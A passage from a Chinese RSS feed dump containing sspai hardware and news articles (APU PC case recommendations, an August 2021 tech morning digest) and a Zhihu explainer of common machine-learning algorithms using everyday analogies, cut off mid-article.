是绝配，更神奇的是实际目前在小黄鱼已经可以买到网友改装好的箱体，如果你喜欢这类风格也不是不可以考虑，就是改装品质不确定。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/04/article/f2e03bb286959c30141c2c49529d8c50\" alt=\"AMD 锐龙5000G APU 玩法攻略\"></figure><h3>ITX</h3>\n<p>这边推荐的自然不是常规 ITX 箱体，而是体积控制更紧凑，在常规装机方案可能是劣势但搭配 APU 反倒有优势的箱体，这类箱体体积基本可以控制在 10L 以内（甚至 5L 以内），可以轻松放入书包，往往支持内置电源少了个尾巴，相比上面的方案还会多出一个 PCIe 插槽，可以用于扩展设备（M.2 SSD、采集卡、声卡等）。</p>\n<p>乔思伯 T8：这款 ITX 箱体我发现受欢迎及关注程度超过我预期。经常有网友咨询相关配置建议。T8 如果装独显方案，之前最大的问题可能就是散热，但如果装 APU 的话，这个问题显然就解决了，加上本身有提手的设计（这类迷你主机很多人喜欢有提手），确实挺适合搭建 APU 主机，目前官方也更新了多种猛男配色。</p>\n<p>配件要求 ITX 主板，ATX\\SFX\\SFX-L 电源（建议选 SFX-L），也可支持一块3.5硬盘，大小8.5L。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/04/article/d9a738bf3b3ba66299432d8187346217\" alt=\"AMD 锐龙5000G APU 玩法攻略\"></figure><p>乔家一物 BO 100：使用形态有点类似 T8，因为外观及提手设计让不少人印象深刻。其实本身支持 207mm 长度以内的独显，但喜欢这个箱体不少人其实对性能要求不高，加上之前显卡价格还有短卡也不多，所以也可以考虑搭配 APU。本身优势就是散热上限高。</p>\n<p>配件要求 ITX 主板，SFX\\SFX-L 电源，大小约 15L。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/04/article/1817f23c24b70c8fe32628a70f2eba76\" alt=\"AMD 锐龙5000G APU 玩法攻略\"></figure><p>工作室作品：目前其它类似及适合的工作室作品 ITX 机箱也挺多，这类箱体在保留一个 PCIE 插槽的同时（一般是短卡或者半高卡），支持内置电源，部分设计也有提手，体积大小可以控制在 5-8L，也是一种选择方向。</p>\n<p>比如 AKLLA A3、机械大师 mc18、鱼巢 S3 和小喆优品 A1 等。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/04/article/1409d79ed02d487de8fb899b8aaf2690\" alt=\"AMD 锐龙5000G APU 玩法攻略\"></figure><h3>HTPC+NAS 主机</h3>\n<p>HTPC 算一个比较古早的概念了，因为硬件平台的发展现在 HTPC 其实会更往数播、网播发展，进一步影响装机形态的改变。而本身这类设备对存储也有强大需求，平台性能</p>\n<p>Turemetal UP3\\UP3PRO ：无风扇+零噪音，这样的概念是不是非常吸引人。早期这类全被动散热 HTPC 箱体还是有几款，无奈用户群太少加之产品太贵，愈发少见。Turemetal 也算是目前少有仅存还在做这类箱体的品牌，其中 UP3\\UP3PRO 就特别适合 APU 平台，外观设计也不错，需搭配 ITX 主板跟 DC 电源，官方建议 CPU 功耗 70W（不超过 110 W）也刚好满足锐龙 5000G APU。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/04/article/5cdc6d8441773722cb5a87d03136de33\" alt=\"AMD 锐龙5000G APU 玩法攻略\"></figure><p>银欣 SilverStone GD05B：如果你还是有传统类 HTPC 装机需求，可以考虑下银欣这款，也是目前少数几款还在售卧式 HTPC 箱体。支持 MATX 主板 + ATX 电源，配件兼容性较好，散热空间及扩展空间都比较充足，方便后期升级扩展设备。</p>\n<p>银欣 SilverStone CS330：APU+NAS 主机也是一个比较有意思的组合，因为本身数播设备对存储就有较大要求，这类箱体近乎可以提供无限的存储扩展空间，其实也是以前 HTPC 的一个玩法流派，甚至在平时也可以兼顾局域网内的数播解码及存储共享。</p>\n<p>这类玩法首先推荐的就是银欣的 CS330，这款箱体其实是基于经典的 TJ08 改造而成，所以本身散热效能不错，支持 MATX 主板+ ATX 电源，配件兼容性较好装机成本较低，非改装扩展情况下最多可支持 8 块机械硬盘，其中三个是可拔插设计。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/04/article/5dae636da46512480059dd836d334d18\" alt=\"AMD 锐龙5000G APU 玩法攻略\"></figure><p>银欣 SilverStone CS381\\CS380：如果 CS330 还不够满足你的话，那么就可以看下这两款更高端的型号了。</p>\n<p>CS380，塔式箱体，支持 ATX 主板+ATX 电源，配件兼容性较好，本身就提供 8 个 3.5 热拔插硬盘位，加上两个光驱位可供改装使用，所以你有海量视频存储需求可以考虑，毕竟这种  ATX 箱体多硬盘稳定性也比较好。</p>\n<p>CS381，卧式箱体设计，支持 ATX 主板+SFX/SFX-L 电源，配件兼容性相对较高，最多支持 12 个硬盘，提供 8 个3.5热拔插，适合搭建高端数播网播主机。</p>\n<p>另外银欣家比较特殊的还有一款 CS01-HS，外观设计比较特别，铝合金壳体。不过是支持2.5英寸设备，有 SAS 或者 SSD 存储需求的可以考虑。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/04/article/66255a6b38333050e53713b57775e713\" alt=\"AMD 锐龙5000G APU 玩法攻略\"></figure><p> </p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/04/article/8bdb1700f128b40f47924d31bee17f40\" alt=\"AMD 锐龙5000G APU 玩法攻略\"></figure><p>乔思伯 N1：看起来像 V8 改装版，实际小了许多，体积仅为 13L 左右，不过最多可支持 6 硬盘（5x3.5+1x2.5），也保留了一个 PCI 半高扩展位，支持硬盘热拔插，还有前置 Type-C 接口，加上本身可立可卧设计，也是一个不错的数播/NAS 装机选择。</p>\n<p>装机配件需要 ITX 主板+SFX 电源。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/04/article/8d476ab4c44a307eabea2593e62c1788\" alt=\"AMD 锐龙5000G APU 玩法攻略\"></figure><p><strong>其它配件说明</strong></p>\n<p>微星 B550M MORTAR：相比更高端平台，锐龙 5000G APU 可以搭配的主板无论是选择范围还是性价比都可以说非常好，比如一众 B550MATX 主板，而其中微星的 B550M MORTAR 更可以说是其代表。介绍什么都不如实测，这次搭配 R7 5700G，直接杀到内存上限，FCLK  频率甚至也可以同步，可以看出微星对这块主板的调教优化。无论是扩展性，供电及超频能力，都是无脑选择，唯一要注意就是能选 WIFI 版就选 WIFI 版，我现在自己用的这块也后悔没选 WIFI 了。</p>\n<p>目前经过一轮降价其实已经比 B450M 更值得购买了（毕竟供电什么也全面升级，还支持前置Type-C）</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/04/article/08c87ad6e55a504f3cd19762d51895b7\" alt=\"AMD 锐龙5000G APU 玩法攻略\"></figure><p>全汉 Hydro G Pro850 ：这次用于测试的电源，为 Hydro 系列二代产品，全日系电容，单路 12V 设计，加上 850W，也比较适合目前高端高功耗显卡的配置。看了下还支持全新防潮技术，可在潮湿恶劣环境下使用，过 80PLUS 金牌，提供 10 年质保。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/04/article/5d09c6027174de45051bf14aee9b6563\" alt=\"AMD 锐龙5000G APU 玩法攻略\"></figure><p><strong>关联阅读：</strong></p>\n<ul><li><a href=\"https://sspai.com/post/67469\">老显卡也能拥有的新体验：AMD FSR 实测</a></li></ul>\n<p>&gt; 下载少数派 <a href=\"https://sspai.com/page/client\">客户端 </a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号 </a>，了解更妙的数字生活 🍃</p>\n<p>&gt; 想申请成为少数派作者？<a href=\"https://sspai.com/apply/writing\" target=\"_blank\">冲！</a></p>\n<p> </p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/68109"},{"title":"派早报：Apple 发布《扩展儿童保护》Q&amp;A 文档、京东方推出屏下摄像头技术等","date":"2021-08-10 01:01:13","description":"\n<h2>你可能错过的新鲜事</h2>\n<h3>Apple 发布《扩展儿童保护》Q&amp;A 文档</h3>\n<p>针对此前 CSAM 系统引发的相关争议，Apple 于 8 月 9 日发布了一份名为《扩展儿童保护》的 Q&amp;A 文档，Apple 表示「自 CSAM 宣布以来，包括隐私倡导和儿童安全组织在内的许多利益相关者，都明确表达了对这套新解决方案的支持。与此同时，也有一些人提出了相关问题。而这份文件的出现，就是为了解决这些问题，并提升此过程中的清晰度与透明度。」</p>\n<p>为此 Apple 认为部分讨论模糊了两项功能之间的本质区别，文档中 Apple 表示「消息服务中的通信安全，仅适用于在家庭共享中设置了儿童账户的消息应用中收发的图像。而针对 iCloud 上的 CSAM 检测，也只影响选择通过 iCloud 来存储相册的用户。任何其它设备上的数据，都不在此列。」简而言之就是两项功能并不相同，基于不同的技术实现。感兴趣的朋友可以参看 Apple 的这项文档。<a href=\"https://www.apple.com/child-safety/pdf/Expanded_Protections_for_Children_Frequently_Asked_Questions.pdf\" target=\"_blank\">来源</a></p>\n<h3>京东方推出柔性 OLED 屏下摄像头技术</h3>\n<p>近日，京东方推出新一代柔性 OLED FDC（Full Display with Camera）技术，可做到摄像区域与周边显示无差异，显示细腻度达 400ppi。新一代技术采用一驱一像素电路设计，即一个 OLED 像素单元对应一个像素电路驱动。该技术目前已应用于部分一线厂商的屏下摄像头机型。<a href=\"https://www.ithome.com/0/568/218.htm\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c48sth5b34tcdd5rnsa0.png\"></figure><h3>51Talk 对境内青少年停售境外外教课程</h3>\n<p>8 月 9 日，在线英语教育服务 51Talk 发文表示，为响应「双减」政策，51Talk 将调整业务，即日起对境内青少年停售境外外教课程，并将发展重心转移至海外市场与成人英语教育。<a href=\"https://mp.weixin.qq.com/s/i2RcDNDgUMlSE-dlvRFwmA\" target=\"_blank\">来源</a></p>\n<h3>「Apple 支持」App 更新，允许设备列表添加 AirPods</h3>\n<p>8 月 10 日，「Apple 支持」App 更新至 4.3 版本后，已配对的 AirPods 可以添加至拥有的设备列表中，可以直接在 iPhone 端查看 AirPods 剩余保修期。</p>\n<h3>Xbox 即将召开 Gamescom 2021 展前发布会</h3>\n<p>8 月 9 日，Xbox 官网更新信息，正式宣布将在北京时间 8 月 25 日举办 Gamescom 2021 展前发布会，届时将透露有关最新游戏和合作的相关讯息。除此之外，Gamescom 2021 将在 26 日凌晨 2 点正式开幕。<a href=\"https://news.xbox.com/en-us/2021/08/09/join-us-for-the-gamescom-2021-xbox-stream-and-more/\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c48sthdb34tcdnn5b5t0.png\"></figure><h3>世嘉 4X 策略游戏《人类》将于 8 月 17 日上市</h3>\n<p>世嘉与 Amplitude 合作开发的 4X 策略类游戏《人类》开启预购。该游戏以历史作为背景，玩家可以在游戏中重新书写人类故事，塑造自己的文明。该游戏将于 8 月 17 日上市，首发 PC 与 Xbox Game Pass 平台，预购目前可选择通过 Steam、Google Stadia 与 Epic Games 购入。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c48sthlb34tcdd5rnsag.png\"></figure><h2>看看就行的小道消息</h2>\n<ul>\n<li>据 DigiTimes 来自供应链的消息，搭载 mini-LED 显示屏的全新 14 英寸与 16 英寸 MacBook Pro 已经进入批量生产阶段，预计月产量可达 80 万台。<a href=\"https://www.macrumors.com/2021/08/09/redesigned-macbook-pros-entering-mass-production/\" target=\"_blank\">来源</a>\n</li>\n<li>知名爆料者 Ishan Agarwal 放出疑似 Redmi 10 国际版的渲染图。该机型采用 6.5 英寸居中打孔屏，搭载四枚后置摄像头，并采用联发科 Helio G88 芯片。<a href=\"https://twitter.com/ishanagarwal24/status/1424359816340795395\" target=\"_blank\">来源</a>\n</li>\n<li>开发者 Brendan Shanks 在 Xcode 最新 beta 中找到了关于 iOS 14.8 的描述，发布时间尚不明朗。<a href=\"https://appleinsider.com/articles/21/08/09/apple-preparing-ios-148-release-as-ios-15-launch-nears\" target=\"_blank\">来源</a>\n</li>\n</ul>\n<h2>少数派的近期动态</h2>\n<p><strong>📰 内容动态</strong></p>\n<ul>\n<li>🚗 由少数派数字工具组联合非旭和老麦制作的《特别少数派·中国西部游自驾指南》现已 <a href=\"http://west.sspai.com/\" target=\"_blank\">上线</a>。</li>\n<li>🌟 少数派会员通讯《<a href=\"https://sspai.com/prime/precog\" target=\"_blank\">职场生存手册</a>》已经上线，带你关注职场的生存法则与自我保护议题。</li>\n<li>📕 由少数派编辑部联合优秀作者出版的实体书《数字时代的效率手册》已经印刷完毕，即将上线各大电商平台，少数派预购会员将获赠该书。</li>\n<li>📷️ 聊聊你最爱的那枚镜头，去 <a href=\"https://sspai.com/bullet/1627633392\" target=\"_blank\">一派</a> 和大家交流一下摄影心得吧。</li>\n</ul>\n<p><strong>💰 折扣促销</strong></p>\n<ul>\n<li>💿 Microsoft 365 <a href=\"https://item.taobao.com/item.htm?id=638827544500\" target=\"_blank\">限时促销</a>，下单再送定制鼠标垫，活动即将结束。</li>\n<li>⚙️ 工具升值包、付费栏目限时 <a href=\"https://sspai.com/post/67817\" target=\"_blank\">特惠加上新</a>，开启你的暑假充电计划。</li>\n<li>📺 <a href=\"https://sspai.com/item/4\" target=\"_blank\">Downie 工具升值包</a> 上线，限时特惠进行中。</li>\n<li>🎁️ 少数派商店 <a href=\"https://sspai.com/post/68166\" target=\"_blank\">七夕折扣</a> 进行中，这些好物送 TA 也能送自己。</li>\n</ul>\n<h2>你可能错过的文章</h2>\n<ul>\n<li>🧓🏻 <a href=\"https://sspai.com/post/68127\" target=\"_blank\">爸妈的手机又出问题了？这些方案或许真的能帮到你</a>\n</li>\n<li>📴️ <a href=\"https://sspai.com/post/68101\" target=\"_blank\">巧用快捷指令开关机，让 iPhone 成为 Mac 的遥控板</a>\n</li>\n<li>📷️ <a href=\"https://sspai.com/post/66923\" target=\"_blank\">在街头摄影，也在街头做一个讲故事的人</a>\n</li>\n<li>⭐️️ <a href=\"https://sspai.com/post/68188\" target=\"_blank\">派评 | 近期值得关注的 App</a>\n</li>\n</ul>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\" target=\"_blank\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\" target=\"_blank\">少数派公众号</a>，解锁全新阅读体验 📰</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\" target=\"_blank\">正版软件</a>，少数派为你呈现 🚀</p>\n<p> </p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/68193"},{"title":"人工智能算法是什么，能简述一下吗？","date":"2021-08-09 23:08:04","description":"<div>\n<div>\n<div>\n<img src=\"https://pic1.zhimg.com/v2-97e92f7ff7354ae4287d8a0734af1133_l.jpg?source=8673f162\"><span>李明殊，</span><span>数码胶片XX法师群群成员(33/79)</span>\n<a href=\"https://www.zhihu.com/question/429749137/answer/2043473947\" hidden>阅读原文</a>\n</div>\n<div>\n<p><strong>从江湖算命到人工智能</strong></p>\n<p><em>前言:</em><em>​</em></p>\n<p><em>这篇文章是与一个朋友闲聊时候的话题，后来想着索性整理成文章，为了让更多的同学理解人工智能的相关内容和常见算法思想，<strong>我决定不使用公式或者代码，尽量用一些简单通俗的例子</strong>，但是这样必然有失准确性，有什么问题可以在评论区里边讨论。</em> ​</p>\n<p>​</p>\n<p>社会进步在发展中部分领域呈现了令人惊异的相似性。</p>\n<p>前几天，看到有群研究者整理了一份 AI 为了完成任务所耍了一些小心思，觉着十分有趣，摘抄两个小例子： ​</p>\n<blockquote>问题：检测 X 光片有无肺炎 ​<br>程序实际检测的不是 X 光片的内容而是拍摄它使用的机器，因为它“发现”病重的病人更可能在特定的医院使用特定的机器拍片（Zech et al, 2018） ​</blockquote>\n<p>​</p>\n<blockquote>问题：检测皮肤癌 ​<br>程序发现照片里皮肤病变的边上如果放了一把尺子，那么这个病变就更可能是恶性的（Andre Esteva et al, 2017） ​</blockquote>\n<p>仔细一看，这不就是江湖算命大(pianzi)师(zi)的套路嘛。 ​</p>\n<p>如果你曾经了解过江湖算命这个行当，会发现他们一个惯用的套路就是，第一时间并不会问你所问何事，会故作高深地凝视你一会，然后得出几个结论，问你他说的对不对。</p>\n<p>然后你会惊呼：</p>\n<blockquote>『你算得真准』。 ​</blockquote>\n<p>本质上这个过程并不是算命，而是『观察』和『总结』的能力：</p>\n<ul>\n<li>如是老年人问事业多半子女不孝；</li>\n<li>如是年轻人穿着破烂，多是英雄迷途不知前路；</li>\n<li>如是年轻女性问，十有八九是姻缘，再看其神色则可知是热恋，还是年轻人要闹分手了。 ​</li>\n</ul>\n<p>从概率上讲，这些论断八九不离十，你也可以尽量朝坏了说，毕竟，一个人过得开心快乐，生活幸福美满，他是不会去算命的。</p>\n<p>人类的学习和认知，大部分结论是来自于经验总结，根据历史和经验归纳出规律； 当遇到新的问题的时候，再根据总结出的规律，进行预测。</p>\n<figure><img src=\"https://pica.zhimg.com/v2-fee9816513e61962f0a8cf92b274ed42_720w.jpg?source=8673f162\" alt=\"\"></figure><p>不过有趣的是，<strong>人类从历史中得到的唯一教训，就是人类从来不从历史中接受教训。</strong> ​</p>\n<p>相似的，而机器学习不是基于推理的“演绎法”，而是基于观测的“归纳法”。 ​</p>\n<p>这个过程中，使用算法处理历史数据，在机器学习中，叫做『训练』；</p>\n<p>『训练』得到的结果是一个『关系』，这个关系可以描述历史数据，也可以预测新的数据，这个『关系』，被称之为模型。 ​</p>\n<p>​</p>\n<p><strong>机器学习​</strong></p>\n<p>我们把经验和历史（包含特征和结果）这些数据扔给机器，让他自动找出特征和结果之间的关系（模型），然后在利用这个模型进行预测和分类，这个过程就是所谓的机器学习。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-25b7b7825a15efa6b4d42681d22c5455_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>华强买瓜 - 线性回归（Linear Regression）</strong></p>\n<p>让我们来举一个小例子。 ​</p>\n<p>有一个人前来买瓜。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-d757b094fd63fc4f882f3bc8bdde0e95_720w.jpg?source=8673f162\" alt=\"\"></figure><p>假如旁边有一个计算机，他并不知道西瓜的价格，他只能观察到称上的数字（重量），和付了多少钱（价格）。 当有很多『华强』来买瓜，这个计算机便收集了很多重量和价格的数据。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-bf71bc387ea03fd58f345ddf41eeaf6f_720w.jpg?source=8673f162\" alt=\"\"></figure><p>我们把这些数据列出来，计算机会从中找出一条规律，其实就是找到一条线，让这条线尽量经过所有数据点，或者尽量离所有数据点最近。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-5a048ecd483f3b7f38d67305609ed065_720w.jpg?source=8673f162\" alt=\"\"></figure><p>很快，计算机就找到这条线，用一个函数来表达：</p>\n<div><code>价格=重量×2 </code></div>\n<p>这个规律也就是，商贩口中的『两块钱一斤』。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-8dca33a35e867459c94bf325d58c6dab_720w.jpg?source=8673f162\" alt=\"\"></figure><p>如果还有人来买瓜，计算机就可以根据这个规律来报出价格。 ​</p>\n<p>当然这个是一个简单的线性模型，也可以是其它类型的曲线，比如抛物线，或者指数关系，机器学习有很多的算法，比如最为经典的梯度下降算法，这也就是我们所说的线性回归。 ​</p>\n<p>当然，也有能够进行『非线性拟合』的算法。</p>\n<p><strong>打游戏吗 - 决策树模型（Decision Tree）</strong></p>\n<p>还有一种经典的机器学习模型 ，叫做决策树，从上到下，好像是一个开枝散叶的树。</p>\n<p>简单来说，就是根据一层层的判断，来做最终的决策或者分类。 ​</p>\n<p>就拿周六要不要打游戏这件事情来说，决策树模型如下：</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-d6d66c0b75e3b02487f7d1534e859511_720w.jpg?source=8673f162\" alt=\"\"></figure><p>要不要打游戏这件事情，受到多个变量的控制：</p>\n<p>取决于你有没有女朋友要陪，取决于你有没有紧急的工作要完成。 ​</p>\n<p>那么这个决策树是怎么来的，来自于以往的经验和数据，当把这些数据输入到计算机中，就可以按照一定的算法生成决策树模型。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-2e4ce445be1e3fa33fe293e5ff5f18db_720w.jpg?source=8673f162\" alt=\"\"></figure><p>当然以上的决策树是一个简单的模型，大家可以看到，『有没有女朋友』这个特征的重要性被过度放大了： ​</p>\n<p>假如你有女朋友，但是你的女朋友不需要陪，根据这个决策树，你毅然决然的选择了打游戏，但是有一项重要的工作你并没有完成，周一上班老板肯定要砍了你的那种，<strong>所以单一的决策树往往会造成偏差。</strong> ​</p>\n<p><strong>女朋友比工作重要吗 - 随机森林（Random Forests）</strong></p>\n<p>​</p>\n<p>怎么解决呢，可以通过随机挑选多个特征构建多个决策树，之后再通过『投票』的方式来进行最终的决策，这种方式被称之为『随机森林』（Random Forests）。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-77623f831cf3e44a66222e0fe1031e28_720w.jpg?source=8673f162\" alt=\"\"></figure><p>但是如果你精力旺盛，好家伙，同时交了八个女朋友，因为每个女朋友脾气秉性，对你的依赖程度也不尽相同，随机森林这种『随机挑选』特征的方式有可能就会导致错误。 ​</p>\n<p><strong>交了八个女朋友 - 梯度提升（Gradient Boosting）​</strong></p>\n<p>于是又诞生了，梯度提升树（GBDT）。 思路步骤如下： ​</p>\n<p>1.与随机森林不同的是，并不是随机挑选特征来生成树，梯度提升树采用了所有的特征来构建决策树；</p>\n<p>2.然后把预测的结果与真实的结果进行比对，计算出一个差值，根据这个差值，对于某些重要特征赋予权重。建立新的决策树模型，比如你给女友 A 赋予了更高的权重，其它女友的权重甚至都没有工作重要；</p>\n<p>3.不断的重复这个步骤，就可以获得准确性更高的的决策树模型，最终多个决策树模型的和就是最终结果。</p>\n<p>​</p>\n<p>杨绛先生书中说，</p>\n<blockquote>精通命理的对以往的事历历如绘，不差分毫。但推算将来，则茫如捕风。 ​</blockquote>\n<p>机器学习也同样如此，对于历史的数据太容易做拟合了，只要你愿意，每一个过往的数据都能给你拟合上，做预测，大部分都抓瞎了，只能给出一个概率。</p>\n<p>这是因为什么呢，大量的现实问题，并不是『重量』，『价格』这样明确的数字，他们有可能不是数值，有可能包含多个属性，为了更好的量化他们，所以很多时候我们需要给数据打标签，其实人类在生活中，很多的时候也下意识这么做，会给人群打上标签，地域黑，00 后，五毛党，海军，米粉，就是这么来的。 ​</p>\n<p>可见数据越多，模型就会越加的准确，这也就是机器学习中『数据为王』的原因。</p>\n<p>你的数据标准更加全面，更加准确，无疑可以获得更加精确的结果。</p>\n<p>​</p>\n<p>人工智能最为典型的应用，图像识别，内容归类，疾病判断，搜索推荐。其实最基础的操作，就是分类。 ​</p>\n<p><strong>分类的奥义</strong><strong>我是哪种人 - 邻近算法(KNN，K-NearestNeighbor)</strong></p>\n<p>所谓 K 临近算法，就是有 K 个最近的邻居的意思。 ​</p>\n<p>思路也很简单：</p>\n<p>1.计算一个新数据与已有数据的距离；</p>\n<p>2.对距离进行排序，选择距离最小的 K 个点；</p>\n<p>3.对于 K 个点的属性进行查看，把这个新数据归类到那个最多的类别中去。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-218adc628043ec791ac83786b0c887d4_720w.jpg?source=8673f162\" alt=\"\"></figure><p>一个小例子，假如只有两种学生，一种勤奋苦学的，一种是吊儿郎当的，他们之间的差异是学习时间和抖音时长。 历史数据如下：</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-858822d2814c1804bbbefa7c790f7c8a_720w.jpg?source=8673f162\" alt=\"\"></figure><p>这时候有一个新人，叫孙八，学习时间 3 小时，游戏时间 5 小时，他属于那种类型的呢？</p>\n<p>做一下数据可视化，我们一眼就可以看出孙八到底属于哪种类型。</p>\n<figure><img src=\"https://pica.zhimg.com/v2-58aeb9beae355ca8231127df7919079c_720w.jpg?source=8673f162\" alt=\"\"></figure><p>当然，算法没有你这么好的眼力，他还得老老实实的计算新数据每一个数据点的距离，然后排个序。</p>\n<p>这时候我们只要统计前 K 个数据的标签是什么，就知道新数据应该划分到那个类别。 ​</p>\n<p>当然这个例子为了简化，只用了时间一个维度的数据，实际上 KNN 算法可以采取多个维度的数据，计算距离的方式也多种多样，最为常用的是欧氏距离。 ​</p>\n<p>K 的取值有时候也会影响结果的准确性。 ​</p>\n<p><strong>那么如何选择一个准确的 K 值呢?</strong></p>\n<p>实际中并没有特别通用有效的解法，只能是不断是尝试，更换参数，大家发现，这个过程跟炼丹特别像，<strong>加多少汞，用多少炭，完全不知道，凭着感觉来</strong>，爆炸了就更改下比例再来一次。 ​</p>\n<p>于是调参，也就被戏称为『炼丹』了。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-506ece9bf5a643cb146ea04bc78964a6_720w.jpg?source=8673f162\" alt=\"\"></figure><p>​</p>\n<p><strong>概率的概率 - 贝叶斯分类器(Bayes classifier)</strong></p>\n<p>​</p>\n<p>所谓贝叶斯分类器，主要原理就是贝叶斯定理。</p>\n<p>贝叶斯定理，其实就算计算条件概率的公式，指得就是在事件 B 发生的情况下，事件 A 发生的概率。</p>\n<p>一个很简单的例子，你经常在网上发一些自拍，然后收到了很多私信，那么大概率你是一个美女（帅哥）。</p>\n<p>这里边隐藏了一个『经验概率』，就是我们认为好看的人比难看的人有更大概率收到私信，这个概率被称之为先验概率。</p>\n<p>可以看到这个先验概率存在很大的主观性。</p>\n<p>而且实际生活中，许多的事物是没有办法进行客观判断的，到了互联网时代，大数据和运算力为贝叶斯提供了基础，只要数据量足够多，这个先验概率也会不断的趋于准确。 ​</p>\n<p>再举一个输入法的例子： ​</p>\n<p>如果你使用拼音输入法，输入『tianqi』，那么这个词语可能是，天气，田七，天启。 没有上下文的时候，天气出现的概率要比田七多得多。但是如果你前文出现了中药这两个字，那么是这个词语『田七』的概率就会比『天气』大很多。 为什么呢，我们统计了之前大量的中文资料，『中药 + 田七』这个词组出现的概率要比『中药 + 天气』多得多。 ​</p>\n<p>贝叶斯分类器就是基于这样的原理，来对新的数据进行分类。 ​</p>\n<p><strong>支持向量机（SVM）</strong></p>\n<p>支持向量机，本质上也是一种逻辑回归算法，根据已有数据，用一条线作为数据集的分界线。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-341bc2840da5f3db4cac5134832b5674_720w.jpg?source=8673f162\" alt=\"\"></figure><p>如图所示，两条虚线是数据集的边界线，其实这两条线也能作为两个数据集的分类，但是明显精确度不高，这时候我们需要算出两条线中间的那条实线，也就是离已有数据越远越好，这条分界的实线就被称为『超平面』。 ​</p>\n<p>为什么一条线被称为平面呢，这是因为目前我们的数据是二维的，如果是三维的，这条线就是一个面。离超平面最近的数据点称之为『支持向量』。 ​</p>\n<p>其实这样的分类线用逻辑回归方法也能画出来，那么支持向量机的的优点在哪里？ 我们看这样的数据集。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-d16c5da293d1fc242c4ac568895a36a4_720w.jpg?source=8673f162\" alt=\"\"></figure><p>很明显，是很难画出一条线将两类数据分开，怎么做呢，我们可以采用<strong>『核函数』</strong>这种数学手段，<strong>把数据转换到高维度。 </strong></p>\n<figure><img src=\"https://pic1.zhimg.com/v2-4336ff6657a2e4d00f272d2e0d26162f_720w.gif?source=8673f162\" alt=\"\"></figure><p>这样我们就很容易画出这个『超平面』，来对数据进行分类。</p>\n<p><strong>未被标注的数据</strong></p>\n<p>​</p>\n<p>以上所有的训练数据，都经历过标注，这些算法也被称之为监督学习。 ​</p>\n<p>那么如果如果我们手头的数据没有标注，如果通过这些数据来训练模型呢？ 这种不需要标注数据，通过训练得到模型的算法称之为无监督学习。 ​</p>\n<p>最为常见的就是聚类算法。 ​</p>\n<p><strong>人以类聚 -K- 平均算法（K-Means）</strong></p>\n<p>​</p>\n<p>步骤也很好理解： ​</p>\n<p>1.将数据分为 K 组，随机选择 K 个对象作为初始的聚类中心 2.计算每个数据点到这聚类中心的距离； 3.按照距离把这些点分配给给对应的聚类中心。 ​</p>\n<p>​</p>\n<p>其实这就是一个『近朱者赤近墨者黑』的过程，和人类自发组织的过程极其相似： ​</p>\n<ol>\n<li>有一大群人，接收到命令，要分为若干个群体，这时候肯定会有人自发站出来当小组长（随机的聚类中心）；</li>\n<li>然后人们会按照跟组长的相似性（爱好，习惯）来决定跟定那个组（计算距离，归类）;</li>\n<li>这时候组已经建成，通过相互了解，人们发现，组里有一个人更加契合组长的要求，然后推选他作为新的组长(算法选出新的聚类中心)；</li>\n</ol>\n<figure><img src=\"https://pic1.zhimg.com/v2-378428c23876868f80dafbbbf33cfd60_720w.jpg?source=8673f162\" alt=\"\"></figure><p>​</p>\n<p>​</p>\n<p><strong>衡量你我的关系 - 降维算法（Dimensionality Reduction）</strong></p>\n<p>数据有多少维度？</p>\n<p>就拿你举例子吧，关于你的数据，有身高，体重，三围，口味，喜欢的电影，在哪个大学读书，历史观，年收入，喜欢的人，是什么？</p>\n<p>种种数据，要完全的形容你，这个数据可以轻松松达到百维，甚至千维。 而每当增加一个维度时，数据体积也就会指数级的增长，以现在机器的处理能力根本没有办法应对，这种情概况，也被称之为维数灾难。</p>\n<p>那就，降维打击吧。 ​</p>\n<p>我们从一个现实的例子感受一下『数据降维』的过程。 ​</p>\n<p>人与人之间的交往关系，是特别复杂的： 